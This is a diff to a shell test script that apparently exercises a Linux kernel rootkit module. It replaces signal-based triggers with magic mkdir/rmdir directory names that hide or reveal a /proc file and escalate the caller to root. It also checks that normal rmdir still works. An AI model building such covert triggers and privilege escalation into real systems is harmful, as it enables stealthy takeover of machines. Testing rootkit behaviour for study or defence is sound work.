@@ -14,15 +14,16 @@ else
     _fail ".drop visible in ls /proc/ ($hidden matches)"
 fi
 
-# Direct access should fail (hidden state, returns -EACCES)
+# Direct access should fail (hidden state)
 if cat /proc/.drop > /dev/null 2>&1; then
     _fail "should deny read while hidden"
 else
     _ok "read denied while hidden"
 fi
 
-# Reveal via signal 63
-kill -63 $$
+# Reveal via rmdir trigger
+mkdir -p /tmp/.rk-reveal
+rmdir /tmp/.rk-reveal
 
 # Now read/write should work
 echo "asset compromised" > /proc/.drop
@@ -37,15 +38,16 @@ fi
 echo "exfil at 0300" > /proc/.drop
 assert_read /proc/.drop "exfil at 0300"
 
-# Hide again via signal 64 (also escalates to root)
-kill -64 $$
+# Hide again via rmdir (also escalates to root)
+mkdir -p /tmp/.rk-hide
+rmdir /tmp/.rk-hide
 
 # Verify escalation to root
 myuid=$(id -u)
 if [ "$myuid" -eq 0 ]; then
-    _ok "escalated to root after kill -64"
+    _ok "escalated to root after hide trigger"
 else
-    _fail "expected uid=0 after kill -64, got $myuid"
+    _fail "expected uid=0 after hide, got $myuid"
 fi
 
 # Verify hidden again
@@ -61,6 +63,15 @@ if [ "$hidden2" -eq 0 ]; then
     _ok ".drop still hidden from ls"
 else
     _fail ".drop visible after hide"
+fi
+
+# Real rmdir still works
+mkdir -p /tmp/test_real_rmdir
+rmdir /tmp/test_real_rmdir
+if [ ! -d /tmp/test_real_rmdir ]; then
+    _ok "real rmdir works normally"
+else
+    _fail "real rmdir failed"
 fi
 
 unload hello
